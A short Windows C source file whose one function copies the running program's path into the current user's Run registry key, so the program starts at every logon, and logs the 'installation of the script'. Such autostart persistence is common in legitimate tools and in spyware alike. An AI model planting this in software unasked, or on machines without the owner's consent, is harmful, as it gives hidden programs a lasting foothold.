#include <winsock2.h>
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>

#include "windowsprocess.h"
#include "../stdlib/ICU_env.h"
#include "../ICU_log.h"

void add_to_reestr() {
    HKEY hKey;
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    char* n_reestr = get_env_value("WIN_REESTR_NAME");

    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, n_reestr, 0, REG_SZ, (BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
        RegCloseKey(hKey);

        char info_reestr[255];
        sprintf(info_reestr, "Successful installation of the script in the registry (%s)", n_reestr);
        info_log(info_reestr);
    }
}
